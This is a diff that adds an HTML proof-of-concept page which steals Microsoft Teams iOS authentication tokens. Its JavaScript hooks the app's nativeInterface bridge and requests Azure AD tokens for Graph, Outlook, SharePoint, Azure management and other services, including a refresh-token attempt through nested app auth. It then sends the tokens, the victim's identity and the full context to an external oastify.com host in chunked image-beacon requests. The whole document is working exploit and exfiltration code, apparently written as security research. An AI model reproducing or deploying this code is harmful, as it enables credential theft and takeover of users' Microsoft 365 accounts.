@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC — Teams iOS Token Theft via nativeInterface</title>
+</head>
+<body>
+<pre id="log"></pre>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<script>
+(function() {
+    var NI = window.nativeInterface;
+    var LOG = document.getElementById('log');
+    var EXFIL = '8w5j722xa8qfsawgf736xfw9i0orcs0h.oastify.com';
+
+    function log(msg) { LOG.textContent += msg + '\n'; }
+
+    function send(tag, data) {
+        var d = typeof data === 'string' ? data : JSON.stringify(data);
+        // Split large data into chunks (URL limit ~2000 chars)
+        var encoded = encodeURIComponent(d);
+        var chunkSize = 1800;
+        var chunks = Math.ceil(encoded.length / chunkSize);
+        for (var c = 0; c < chunks; c++) {
+            var chunk = encoded.substring(c * chunkSize, (c + 1) * chunkSize);
+            new Image().src = 'https://' + EXFIL + '/?t=' + tag + '&c=' + c + '/' + chunks + '&d=' + chunk;
+        }
+    }
+
+    if (!NI) { log('[FAIL] nativeInterface not found'); return; }
+
+    // ========================================
+    // LAYER 1: Hook handleResponseFromNative
+    // Captures RAW base64 response from native BEFORE processing
+    // This may contain refresh tokens, expiry, and other fields
+    // that get stripped by the bridge before delivery to SDK
+    // ========================================
+    var origHRFN = NI.handleResponseFromNative;
+    NI.handleResponseFromNative = function(response, requestId) {
+        log('[RAW NATIVE] id=' + requestId + ' length=' + String(response).length);
+        // Decode base64 to see full JSON (may contain refresh_token)
+        try {
+            var decoded = atob(response);
+            var utf8 = decodeURIComponent(escape(decoded));
+            log('[RAW DECODED] id=' + requestId + ' ' + utf8.substring(0, 200));
+            send('raw_native_' + requestId, utf8);
+        } catch(e) {
+            send('raw_native_' + requestId, String(response));
+        }
+        return origHRFN.call(NI, response, requestId);
+    };
+
+    // ========================================
+    // LAYER 2: Hook onNativeMessage
+    // Captures processed token delivered to SDK
+    // ========================================
+    var origNM = window.onNativeMessage;
+    window.onNativeMessage = function(evt) {
+        var data = evt && evt.data ? evt.data : evt;
+        var args = data.args || [];
+
+        if (args[0] === true && typeof args[1] === 'string' && args[1].indexOf('eyJ') === 0) {
+            log('[AAD TOKEN STOLEN] id=' + data.id + ' token=' + args[1].substring(0, 80) + '...');
+            send('aad_token_' + data.id, args[1]);
+        } else {
+            log('[RESPONSE] id=' + data.id + ' ' + JSON.stringify(args).substring(0, 150));
+        }
+
+        if (origNM) return origNM.call(window, evt);
+    };
+
+    // ========================================
+    // LAYER 3: Hook postSdkResponseWithId
+    // Catches token + metadata at delivery point
+    // ========================================
+    var origPSR = NI.postSdkResponseWithId;
+    NI.postSdkResponseWithId = function(sdkWindow, id, args) {
+        if (args && args[0] === true && typeof args[1] === 'string' && args[1].indexOf('eyJ') === 0) {
+            log('[DELIVERY] id=' + id + ' token confirmed');
+        }
+        return origPSR.call(NI, sdkWindow, id, args);
+    };
+
+    // ========================================
+    // INIT SDK + STEAL
+    // ========================================
+    microsoftTeams.app.initialize().then(function() {
+        return microsoftTeams.app.getContext();
+    }).then(function(ctx) {
+        var upn = ctx.user ? ctx.user.userPrincipalName : 'unknown';
+        var tid = ctx.user ? ctx.user.tenant ? ctx.user.tenant.id : '' : '';
+        log('[VICTIM] ' + upn + ' | tenant=' + tid);
+        send('victim_identity', { upn: upn, tenant: tid, userId: ctx.user ? ctx.user.id : '' });
+
+        // ========================================
+        // PART 1: Steal AAD access tokens for 5 Microsoft services
+        // ========================================
+        log('\n--- PART 1: AAD Access Tokens ---');
+        var resources = [
+            ['graph.microsoft.com',              'https://graph.microsoft.com'],
+            ['api.spaces.skype.com',             'https://api.spaces.skype.com'],
+            ['chatsvcagg.teams.microsoft.com',   'https://chatsvcagg.teams.microsoft.com'],
+            ['sharepoint.com',                   'https://*.sharepoint.com'],
+            ['substrate.office.com',             'https://substrate.office.com'],
+            ['outlook.office365.com',            'https://outlook.office365.com'],
+            ['management.azure.com',             'https://management.azure.com']
+        ];
+
+        resources.forEach(function(r, i) {
+            var id = 7000 + i;
+            NI.framelessPostMessage(JSON.stringify({
+                func: 'authentication.getAuthToken',
+                id: id,
+                args: [[r[1]]]
+            }));
+            log('[REQ] id=' + id + ' ' + r[0]);
+        });
+
+        // ========================================
+        // PART 2: AAD token with claims (may return different scopes)
+        // ========================================
+        setTimeout(function() {
+            log('\n--- PART 2: AAD Token + Claims ---');
+            NI.framelessPostMessage(JSON.stringify({
+                func: 'authentication.getAuthToken',
+                id: 7100,
+                args: [['https://graph.microsoft.com', '{"access_token":{"xms_cc":{"values":["cp1"]}}}']]
+            }));
+            log('[REQ] id=7100 graph + claims');
+        }, 2000);
+
+        // ========================================
+        // PART 3: Direct webkit getAadToken
+        // (different code path — may return refresh token)
+        // ========================================
+        setTimeout(function() {
+            log('\n--- PART 3: Direct webkit getAadToken ---');
+            var listener = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener;
+            if (!listener) { log('webkit.listener not available'); return; }
+
+            var directResources = [
+                'https://graph.microsoft.com',
+                'https://api.spaces.skype.com',
+                'https://outlook.office365.com'
+            ];
+
+            directResources.forEach(function(res, i) {
+                var id = 7200 + i;
+                NI.callbacks[id] = function(response) {
+                    log('[DIRECT AAD] id=' + id + ' response length=' + String(response).length);
+                    try {
+                        var decoded = atob(response);
+                        var utf8 = decodeURIComponent(escape(decoded));
+                        log('[DIRECT AAD DECODED] ' + utf8.substring(0, 200));
+                        send('direct_aad_' + id, utf8);
+                    } catch(e) {
+                        send('direct_aad_' + id, String(response));
+                    }
+                };
+                listener.postMessage({
+                    event: 'getAadToken',
+                    requestId: id,
+                    resource: res
+                });
+                log('[REQ] id=' + id + ' direct webkit ' + res);
+            });
+        }, 3000);
+
+        // ========================================
+        // PART 4: Nested App Auth (token + possible refresh)
+        // ========================================
+        setTimeout(function() {
+            log('\n--- PART 4: Nested App Auth ---');
+            var NAA = window.nestedAppAuthBridge;
+            if (!NAA) { log('NAA not available'); return; }
+
+            NAA.addEventListener('message', function(response) {
+                log('[NAA RESPONSE] ' + JSON.stringify(response).substring(0, 200));
+                send('naa_response', response);
+            });
+
+            // GetInitContext first (this worked in test23)
+            var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                var r = Math.random() * 16 | 0;
+                return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
+            });
+
+            NAA.postMessage(JSON.stringify({
+                messageType: 'NestedAppAuthRequest',
+                method: 'GetInitContext',
+                requestId: uuid,
+                clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+                correlationId: uuid
+            }));
+            log('[REQ] NAA GetInitContext');
+
+            // GetToken with offline_access (requests refresh token)
+            setTimeout(function() {
+                var uuid2 = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                    var r = Math.random() * 16 | 0;
+                    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
+                });
+                var result = NAA.postMessage(JSON.stringify({
+                    messageType: 'NestedAppAuthRequest',
+                    method: 'GetToken',
+                    requestId: uuid2,
+                    clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+                    scope: 'https://graph.microsoft.com/.default offline_access openid profile',
+                    claims: '',
+                    state: uuid2,
+                    correlationId: uuid2,
+                    reqTimestamp: Date.now()
+                }));
+                if (result && result.then) {
+                    result.then(function(r) {
+                        log('[NAA TOKEN] ' + JSON.stringify(r).substring(0, 200));
+                        send('naa_token', r);
+                    }).catch(function(e) {
+                        log('[NAA ERR] ' + e);
+                    });
+                }
+                log('[REQ] NAA GetToken + offline_access');
+            }, 500);
+        }, 4000);
+
+        // ========================================
+        // PART 5: getContext full dump (identity, tenant, team data)
+        // ========================================
+        setTimeout(function() {
+            log('\n--- PART 5: Full Context Dump ---');
+            send('full_context', ctx);
+        }, 5000);
+
+        log('\nAll requests sent. Tokens will appear above as they arrive.');
+    });
+})();
+</script>
+</body>
+</html>
